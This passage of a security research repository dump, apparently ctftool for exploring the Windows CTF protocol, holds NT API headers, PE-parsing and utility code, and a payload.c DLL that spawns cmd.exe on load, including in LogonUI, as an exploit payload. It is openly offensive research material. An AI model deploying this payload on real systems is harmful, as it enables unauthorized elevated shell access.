HANDLE Handle[],\r\n    IN WAIT_TYPE WaitType,\r\n    IN BOOLEAN Alertable,\r\n    IN PLARGE_INTEGER Timeout OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Event support\r\n\r\ntypedef enum _EVENT_INFORMATION_CLASS {\r\n    EventBasicInformation    // = 0\r\n} EVENT_INFORMATION_CLASS;\r\n\r\ntypedef struct _EVENT_BASIC_INFORMATION {\r\n    EVENT_TYPE EventType;\r\n    LONG EventState;\r\n} EVENT_BASIC_INFORMATION, *PEVENT_BASIC_INFORMATION;\r\n\r\n//\r\n// Event handling routines\r\n//\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateEvent (\r\n    OUT PHANDLE EventHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN EVENT_TYPE EventType,\r\n    IN BOOLEAN InitialState\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCreateEvent (\r\n    OUT PHANDLE EventHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN EVENT_TYPE EventType,\r\n    IN BOOLEAN InitialState\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtClearEvent (\r\n    IN HANDLE Handle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwClearEvent (\r\n    IN HANDLE Handle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtPulseEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwPulseEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtResetEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwResetEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetEvent (\r\n    IN HANDLE Handle,\r\n    OUT PLONG PreviousState OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenEvent (\r\n    OUT PHANDLE EventHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwOpenEvent (\r\n    OUT PHANDLE EventHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryEvent (\r\n    IN HANDLE EventHandle,\r\n    IN EVENT_INFORMATION_CLASS EventInfoClass,\r\n    OUT PVOID EventInfo,\r\n    IN ULONG Length,\r\n    OUT PULONG ResultLength OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryEvent (\r\n    IN HANDLE EventHandle,\r\n    IN EVENT_INFORMATION_CLASS EventInfoClass,\r\n    OUT PVOID EventInfo,\r\n    IN ULONG Length,\r\n    OUT PULONG ResultLength OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Mutant support\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateMutant(\r\n    OUT PHANDLE MutantHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN BOOLEAN InitialOwner\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenMutant(\r\n    OUT PHANDLE MutantHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Semaphore support\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateSemaphore(\r\n    OUT PHANDLE SemaphoreHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN ULONG InitialCount,\r\n    IN ULONG MaximumCount\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenSemaphore(\r\n    OUT PHANDLE SemaphoreHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// EventPair support\r\n\r\n#define EVENT_PAIR_ALL_ACCESS ( STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE )\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateEventPair(\r\n    OUT PHANDLE EventPairHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenEventPair(\r\n    OUT PHANDLE EventPairHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Security descriptor functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCreateSecurityDescriptor (\r\n    IN PSECURITY_DESCRIPTOR SecurityDescriptor,\r\n    IN ULONG Revision\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlGetDaclSecurityDescriptor(\r\n    IN PSECURITY_DESCRIPTOR  SecurityDescriptor,\r\n    OUT PBOOLEAN  DaclPresent,\r\n    OUT PACL  *Dacl,\r\n    OUT PBOOLEAN  DaclDefaulted\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlSetDaclSecurityDescriptor(\r\n    IN PSECURITY_DESCRIPTOR SecurityDescriptor,\r\n    IN BOOLEAN DaclPresent,\r\n    IN PACL Dacl OPTIONAL,\r\n    IN BOOLEAN DaclDefaulted OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlSetOwnerSecurityDescriptor (\r\n    IN PSECURITY_DESCRIPTOR SecurityDescriptor,\r\n    IN PSID Owner OPTIONAL,\r\n    IN BOOLEAN OwnerDefaulted OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAllocateAndInitializeSid(\r\n    IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,\r\n    IN UCHAR SubAuthorityCount,\r\n    IN ULONG SubAuthority0,\r\n    IN ULONG SubAuthority1,\r\n    IN ULONG SubAuthority2,\r\n    IN ULONG SubAuthority3,\r\n    IN ULONG SubAuthority4,\r\n    IN ULONG SubAuthority5,\r\n    IN ULONG SubAuthority6,\r\n    IN ULONG SubAuthority7,\r\n    OUT PSID *Sid\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlLengthSid (\r\n    IN PSID Sid\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlEqualSid (\r\n    IN PSID Sid1,\r\n    IN PSID Sid2\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI\r\nRtlFreeSid(\r\n    IN PSID Sid\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCreateAcl(\r\n    IN PACL Acl,\r\n    IN ULONG AclLength,\r\n    IN ULONG AclRevision\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlGetAce(\r\n    IN PACL Acl,\r\n    IN ULONG AceIndex,\r\n    OUT PVOID  *Ace\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAddAccessAllowedAce(\r\n    IN OUT PACL Acl,\r\n    IN ULONG AceRevision,\r\n    IN ACCESS_MASK AccessMask,\r\n    IN PSID Sid\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAddAccessAllowedAceEx(\r\n    IN OUT PACL Acl,\r\n    IN ULONG AceRevision,\r\n    IN ULONG AceFlags,\r\n    IN ULONG AccessMask,\r\n    IN PSID Sid\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Token functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenProcessToken(\r\n    IN HANDLE ProcessHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    OUT PHANDLE TokenHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenThreadToken(\r\n    IN HANDLE ThreadHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN BOOLEAN OpenAsSelf,\r\n    OUT PHANDLE TokenHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryInformationToken(\r\n    IN HANDLE  TokenHandle,\r\n    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,\r\n    OUT PVOID  TokenInformation,\r\n    IN ULONG  TokenInformationLength,\r\n    OUT PULONG  ReturnLength\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryInformationToken(\r\n    IN HANDLE  TokenHandle,\r\n    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,\r\n    OUT PVOID  TokenInformation,\r\n    IN ULONG  TokenInformationLength,\r\n    OUT PULONG  ReturnLength\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetInformationToken(\r\n    IN HANDLE  TokenHandle,\r\n    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,\r\n    IN PVOID  TokenInformation,\r\n    IN ULONG  TokenInformationLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtAdjustPrivilegesToken(\r\n    IN HANDLE TokenHandle,\r\n    IN BOOLEAN DisableAllPrivileges,\r\n    IN PTOKEN_PRIVILEGES NewState OPTIONAL,\r\n    IN ULONG BufferLength OPTIONAL,\r\n    IN PTOKEN_PRIVILEGES PreviousState OPTIONAL,\r\n    OUT PULONG ReturnLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDuplicateToken(\r\n    IN HANDLE ExistingTokenHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes,\r\n    IN BOOLEAN EffectiveOnly,\r\n    IN TOKEN_TYPE TokenType,\r\n    OUT PHANDLE NewTokenHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCompareTokens(\r\n    IN  HANDLE FirstTokenHandle,\r\n    IN  HANDLE SecondTokenHandle,\r\n    OUT PBOOLEAN IdenticalTokens\r\n    );  \r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Symbolic links\r\n\r\n//\r\n// Object Manager Symbolic Link Specific Access Rights.\r\n//\r\n\r\n#ifndef SYMBOLIC_LINK_QUERY\r\n#define SYMBOLIC_LINK_QUERY (0x0001)\r\n#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)\r\n#endif\r\n\r\nNTSYSAPI \r\nNTSTATUS\r\nNTAPI\r\nNtCreateSymbolicLinkObject(\r\n    OUT PHANDLE SymbolicLinkHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes,\r\n    IN PUNICODE_STRING DestinationName\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenSymbolicLinkObject (\r\n    OUT PHANDLE SymbolicLinkHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQuerySymbolicLinkObject (\r\n    IN HANDLE SymbolicLinkHandle,\r\n    OUT PUNICODE_STRING NameString,\r\n    OUT PULONG ResultLength OPTIONAL\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Loader functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nLdrLoadDll(\r\n    IN PWSTR DllPath OPTIONAL,\r\n    IN PULONG DllCharacteristics OPTIONAL,\r\n    IN PUNICODE_STRING DllName,\r\n    OUT PVOID *DllHandle\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nLdrGetDllHandle(\r\n    IN PWSTR DllPath OPTIONAL,\r\n    IN PULONG DllCharacteristics OPTIONAL,\r\n    IN PUNICODE_STRING DllName,\r\n    OUT PVOID * DllHandle\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nLdrUnloadDll(\r\n    IN PVOID DllHandle\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nLdrGetProcedureAddress(\r\n    IN PVOID DllHandle,\r\n    IN PANSI_STRING ProcedureName OPTIONAL,\r\n    IN ULONG ProcedureNumber OPTIONAL,\r\n    OUT PVOID *ProcedureAddress\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Driver functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtLoadDriver(\r\n    PUNICODE_STRING DriverServiceName\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwLoadDriver(\r\n    PUNICODE_STRING DriverServiceName\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtUnloadDriver(\r\n    PUNICODE_STRING DriverServiceName\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwUnloadDriver(\r\n    PUNICODE_STRING DriverServiceName\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Functions dealing with NTSTATUS and Win32 error\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlNtStatusToDosErrorNoTeb(\r\n    NTSTATUS Status\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlGetLastNtStatus(\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlGetLastWin32Error(\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlSetLastWin32Error(\r\n    ULONG WinError\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlSetLastWin32ErrorAndNtStatusFromNtStatus(\r\n    NTSTATUS Status\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Other functions\r\n\r\nNTSYSAPI \r\nNTSTATUS\r\nNTAPI\r\nNtAllocateLocallyUniqueId(\r\n    OUT PLUID LocallyUniqueId\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDelayExecution(\r\n    IN BOOLEAN Alertable,\r\n    IN PLARGE_INTEGER DelayInterval\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDisplayString(\r\n    IN PUNICODE_STRING String\r\n    );\r\n\r\n\r\n#ifdef __cplusplus\r\n} // extern \"C\"\r\n#endif\r\n\r\n#endif // __NTDLL_H__\r\n"
        },
        {
          "name": "payload.c",
          "type": "blob",
          "size": 1.6171875,
          "content": "#include <windows.h>\n\n#pragma comment(lib, \"USER32\")\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n    CHAR Command[] = \"cmd\";\n    CHAR ModulePath[MAX_PATH];\n    CHAR ModuleName[MAX_PATH];\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    ZeroMemory(&ModulePath, sizeof(ModulePath));\n    ZeroMemory(&ModuleName, sizeof(ModuleName));\n    si.cb = sizeof si;\n\n    // Learn what process we've loaded into, in case we need it.\n    if (GetModuleFileNameA(NULL, ModulePath, sizeof ModulePath)) {\n        _splitpath(ModulePath, NULL, NULL, ModuleName, NULL);\n    }\n\n    switch (fdwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n            // attach to process\n            if (CreateProcess(NULL, Command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {\n\n                // LogonUI acts strangely if we try to ExitProcess()\n                if (stricmp(ModuleName, \"LOGONUI\") == 0) {\n                    WaitForSingleObject(pi.hProcess, INFINITE);\n                    TerminateProcess(GetCurrentProcess(), 0);\n                }\n\n                CloseHandle(pi.hProcess);\n                CloseHandle(pi.hThread);\n            } else {\n                MessageBox(NULL, \"Exploit Successful\", \"Exploit\", MB_OK);\n            }\n\n            ExitProcess(0);\n            break;\n        case DLL_PROCESS_DETACH:\n            // detach from process\n            break;\n\n        case DLL_THREAD_ATTACH:\n            // attach to thread\n            break;\n\n        case DLL_THREAD_DETACH:\n            // detach from thread\n            break;\n    }\n    return TRUE; // succesful\n}\n"
        },
        {
          "name": "pe-parse",
          "type": "commit",
          "content": null
        },
        {
          "name": "peproc.cc",
          "type": "blob",
          "size": 3.142578125,
          "content": "#include <iostream>\n#include <iomanip>\n#include <sstream>\n#include <cstring>\n\n#include \"pe-parse/pe-parser-library/include/parser-library/parse.h\"\n\nusing namespace peparse;\n\ntypedef struct _SEARCH_PARAMS {\n    char       *SymbolName;\n    uint64_t    SymbolAddress;\n} SEARCH_PARAMS, *PSEARCH_PARAMS;\n\nstatic int SearchExports(void *user,\n                         VA funcAddr,\n                         std::string &mod,\n                         std::string &func) {\n    auto params  = static_cast<PSEARCH_PARAMS>(user);\n    auto address = static_cast<std::uint64_t>(funcAddr);\n\n    if (params->SymbolName == func) {\n        params->SymbolAddress = address;\n    }\n\n    return 0;\n}\n\nextern \"C\" bool GetSymbolInfo64(char *Filename,\n                                char *Export,\n                                bool *Is64,\n                                uint64_t *ImageBase,\n                                uint64_t *Address)\n{\n    parsed_pe *p = ParsePEFromFile(Filename);\n    SEARCH_PARAMS Parameters;\n\n    if (p == NULL) {\n        return false;\n    }\n\n    *Is64 = p->peHeader.nt.OptionalMagic != NT_OPTIONAL_32_MAGIC;\n\n    *ImageBase = *Is64 ? p->peHeader.nt.OptionalHeader64.ImageBase\n                       : p->peHeader.nt.OptionalHeader.ImageBase;\n\n    Parameters.SymbolName = Export;\n    Parameters.SymbolAddress = 0ULL;\n\n    IterExpVA(p, SearchExports, &Parameters);\n\n    *Address = Parameters.SymbolAddress;\n\n    DestructParsedPE(p);\n\n    if (Parameters.SymbolAddress)\n        return true;\n\n    return false;\n}\n\ntypedef struct _SECTION_PARAMS {\n    char                *SectionName;\n    uint64_t             SectionBase;\n    image_section_header SectionHeader;\n} SECTION_PARAMS, *PSECTION_PARAMS;\n\nstatic int FindSection(void *user,\n                       peparse::VA secBase,\n                       std::string &secName,\n                       peparse::image_section_header s,\n                       peparse::bounded_buffer *data)\n{\n    auto params  = static_cast<PSECTION_PARAMS>(user);\n    auto address = static_cast<std::uint64_t>(secBase);\n\n    if (params->SectionName == secName) {\n        params->SectionHeader = s;\n        params->SectionBase = address;\n    }\n\n    return 0;\n}\n\nextern \"C\" bool GetSectionProperty(char *Filename,\n                                   char *Section,\n                                   char *Property,\n                                   uint64_t *Result)\n{\n    SECTION_PARAMS Params;\n    parsed_pe *p = ParsePEFromFile(Filename);\n\n    if (p == NULL) {\n        return false;\n    }\n\n    Params.SectionName = Section;\n    Params.SectionBase = 0ULL;\n\n    IterSec(p, FindSection, &Params);\n\n    DestructParsedPE(p);\n\n    if (Params.SectionBase == 0)\n        return false;\n\n    if (strcmp(Property, \"VirtualAddress\") == 0) {\n        *Result = Params.SectionHeader.VirtualAddress;\n    } else if (strcmp(Property, \"PointerToRawData\") == 0) {\n        *Result = Params.SectionHeader.PointerToRawData;\n    } else if (strcmp(Property, \"SizeOfRawData\") == 0){\n        *Result = Params.SectionHeader.SizeOfRawData;\n    } else if (strcmp(Property, \"Characteristics\")  == 0) {\n        *Result = Params.SectionHeader.Characteristics;\n    } else {\n        return false;\n    }\n\n    return true;\n}"
        },
        {
          "name": "scripts",
          "type": "tree",
          "content": null
        },
        {
          "name": "tools",
          "type": "tree",
          "content": null
        },
        {
          "name": "util.c",
          "type": "blob",
          "size": 0.861328125,
          "content": "#define WIN32_LEAN_AND_MEAN\r\n#define WIN32_NO_STATUS\r\n#include <windows.h>\r\n#include <winternl.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <ctype.h>\r\n#undef WIN32_NO_STATUS\r\n#include <ntstatus.h>\r\n\r\n#include \"ntdll.h\"\r\n#include \"util.h\"\r\n\r\nULONG VerbosityLevel;\r\n\r\nvoid hexdump(void *ptr, int buflen) {\r\n  unsigned char *buf = (unsigned char*)ptr;\r\n  int i, j;\r\n  for (i=0; i<buflen; i+=16) {\r\n    printf(\"%06x: \", i);\r\n    for (j=0; j<16; j++) \r\n      if (i+j < buflen)\r\n        printf(\"%02x \", buf[i+j]);\r\n      else\r\n        printf(\"   \");\r\n    printf(\" \");\r\n    for (j=0; j<16; j++) \r\n      if (i+j < buflen)\r\n        printf(\"%c\", isprint(buf[i+j]) ? buf[i+j] : '.');\r\n    printf(\"\\n\");\r\n  }\r\n}\r\n\r\n// Apparently Microsoft doesn't have mempcpy....?\r\nPVOID mempcpy(PVOID dest, const PVOID src, SIZE_T count)\r\n{\r\n    return (PBYTE)(memcpy(dest, src, count)) + count;\r\n}\r\n"
        },
        {
          "name": "util.h",
          "type": "blob",
          "size": 0.5322265625,
          "content": "#ifndef __UTIL_H\r\n#define __UTIL_H\r\n\r\nextern ULONG VerbosityLevel;\r\n\r\n#define LogMessage(s, f, ...) fprintf(s, f, __VA_ARGS__), fputc('\\n', s)\r\n#define LogMessageLevel(l, s, f, ...) do {          \\\r\n    if ((l) >= VerbosityLevel) {                    \\\r\n        fprintf(s, f, __VA_ARGS__);                 \\\r\n        fputc('\\n', s)                              \\\r\n    }                                               \\\r\n} while (false)\r\n\r\nvoid hexdump(void *ptr, int buflen);\r\nPVOID mempcpy(PVOID dest, const PVOID src, SIZE_T count);\r\n\r\n#endif\r\n"
        },
        {
          "name": "version.rc",
          "type": "blob",
          "size": 0.580078125,
          "content": "#include <windows.h>\n\nVS_VERSION_INFO VERSIONINFO\nFILEVERSION    1,0,0,0\nPRODUCTVERSION 1,0,0,0\nFILEFLAGSMASK VS_FFI_FILEFLAGSMASK\nFILEFLAGS 0\nFILEOS VOS__WINDOWS32\nFILETYPE VFT_APP\n{\n    BLOCK \"StringFileInfo\"\n    { \n        BLOCK \"000004b0\"\n        {\n            VALUE \"CompanyName\",      \"Tavis Ormandy\"\n            VALUE \"FileDescription\",  \"Interactive CTF Exploration Tool\"\n            VALUE \"ProductName\",      \"ctftool\"\n            VALUE \"Comment\",          \"https://github.com/taviso/ctftool\"\n        } \n    }\n    BLOCK \"VarFileInfo\"\n    {\n        VALUE \"Translation\", 0, 1200\n    }\n}\n"
        },
        {
          "name": "wineditline",
          "type": "commit",
          "content": null
        },
        {
          "name": "winmsg.c",
          "type": "blob",
          "size": 1.958984375,
          "content": "#define WIN32_LEAN_AND_MEAN\r\n#define WIN32_NO_STATUS\r\n#include <windows.h>\r\n#include <winternl.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <msctf.h>\r\n#undef WIN32_NO_STATUS\r\n#include <ntstatus.h>\r\n\r\n#include \"ntdll.h\"\r\n#include \"ntalpctyp.h\"\r\n#include \"ntalpc.h\"\r\n\r\n#include \"ctfinternal.h\"\r\n#include \"ctftool.h\"\r\n\r\n#define LogMessage(s, f, ...) fprintf(s, f, __VA_ARGS__), fputc('\\n', s)\r\n\r\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) \r\n{\r\n    switch (uMsg) {\r\n        case WM_GETMINMAXINFO:\r\n        case WM_NCCREATE:\r\n        case WM_NCCALCSIZE:\r\n        case WM_CREATE:\r\n        case WM_WINDOWPOSCHANGING:\r\n        case WM_ACTIVATEAPP:\r\n        case WM_NCACTIVATE:\r\n        case WM_ACTIVATE:\r\n        case WM_IME_SETCONTEXT:\r\n        case WM_IME_NOTIFY:\r\n        case WM_GETOBJECT:\r\n        case WM_SETFOCUS:\r\n        case WM_DESTROY:\r\n        case WM_NCDESTROY:\r\n        case 0x90: // WM_UAHDESTROYWINDOW\r\n            break;\r\n        default:\r\n            LogMessage(stderr, \"WindowProc(%p, %#x, %p, %p);\", hwnd, uMsg, (PVOID)wParam, (PVOID) lParam);\r\n    }\r\n    return DefWindowProc(hwnd, uMsg, wParam, lParam);\r\n}\r\n\r\nHWND CreateMessageWindow()\r\n{\r\n    WNDCLASSEX WindowClass = {0};\r\n    ATOM Atom;\r\n    HWND MsgWindow;\r\n\r\n    WindowClass.cbSize         = sizeof(WNDCLASSEX);\r\n    WindowClass.lpfnWndProc    = WindowProc;\r\n    WindowClass.lpszClassName  = \"Class\";\r\n\r\n    Atom = RegisterClassEx(&WindowClass);\r\n    MsgWindow = CreateWindowEx(0,\r\n                               MAKEINTATOM(Atom),\r\n                               \"Message\",\r\n                               0,\r\n                               0,\r\n                               0,\r\n                               128,\r\n                               128,\r\n                               0,\r\n                               NULL,\r\n                               NULL,\r\n                               NULL);\r\n\r\n    LogMessage(stdout, \"message window %p\", MsgWindow);\r\n    return MsgWindow;\r\n}\r\n"
        },
        {
          "name": "winutil.c",
          "type": "blob",
          "size": 3.8486328125,
          "content": "#define WIN32_LEAN_AND_MEAN\n#define WIN32_NO_STATUS\n#include <windows.h>\n#include <winternl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <tlhelp32.h>\n#include <psapi.h>\n#include <assert.h>\n#include <objbase.h>\n#include <sddl.h>\n#include <msctf.h>\n#include <shlwapi.h>\n#undef WIN32_NO_STATUS\n#include <ntstatus.h>\n\n#include \"ntdll.h\"\n#include \"ntalpctyp.h\"\n#include \"ntalpc.h\"\n\n#include \"ctfinternal.h\"\n#include \"ctftool.h\"\n#include \"marshal.h\"\n#include \"util.h\"\n#include \"winutil.h\"\n\n#pragma warning(disable: 6011 6387)\n\n// This just duplicates the logic that ctfmon uses for identifying Windows.\nBOOL GetActiveThreadInfo(PDWORD ThreadId, HWND *Window, PDWORD ProcessId)\n{\n    HWND IMEWindow = 0;\n    WCHAR ClassName[32] = {0};\n\n    *Window = GetForegroundWindow();\n\n    if (*Window) {\n        RealGetWindowClassW(*Window, ClassName, _countof(ClassName) - 1);\n        if (wcscmp(ClassName, L\"ConsoleWindowClass\") == 0) {\n            //LogMessage(stdout, \"The active window uses ConsoleWindowClass.\");\n            IMEWindow = ImmGetDefaultIMEWnd(*Window);\n        }\n    }\n    if (IMEWindow) {\n        *ThreadId = GetWindowThreadProcessId(IMEWindow, ProcessId);\n    } else {\n        *ThreadId = GetWindowThreadProcessId(*Window, ProcessId);\n    }\n\n    return *Window != NULL;\n}\n\nDWORD GetFocusThread(void)\n{\n    HWND Window;\n    DWORD ThreadId;\n    GetActiveThreadInfo(&ThreadId, &Window, NULL);\n    return ThreadId;\n}\n\n#define MAX_PROCESS 16384\n\nPVOID QueryImageName(DWORD ProcessId)\n{\n    CHAR ImageName[MAX_PATH];\n    ULONG ReturnLength;\n    PSYSTEM_PROCESS_INFORMATION ProcessArray, Current;\n    PVOID ReturnValue = NULL;\n    NTSTATUS Result;\n\n    ReturnLength = MAX_PROCESS * sizeof(SYSTEM_PROCESS_INFORMATION);\n    ProcessArray = malloc(ReturnLength);\n\n    Result = NtQuerySystemInformation(SystemProcessInformation, ProcessArray, ReturnLength, &ReturnLength);\n\n    if (Result != 0) {\n      LogMessage(stderr, \"Unexpected NtQuerySystemInformation() result, %#x\", Result);\n      return NULL;\n    }\n\n    for (Current = ProcessArray;; Current = (PVOID)((PBYTE)(Current) + Current->NextEntryOffset)) {\n        #pragma warning(suppress: 4047)\n        if (Current->UniqueProcessId == ProcessId) {\n          snprintf(ImageName, sizeof ImageName, \"%wZ\", &Current->ImageName);\n          ReturnValue = strdup(ImageName);\n          break;\n        }\n        if (Current->NextEntryOffset == 0) {\n          LogMessage(stderr, \"QueryImageName, Unknown Process %u\", ProcessId);\n          break;\n        }\n    }\n    free(ProcessArray);\n    return ReturnValue;\n}\n\n// This finds the first process with matching 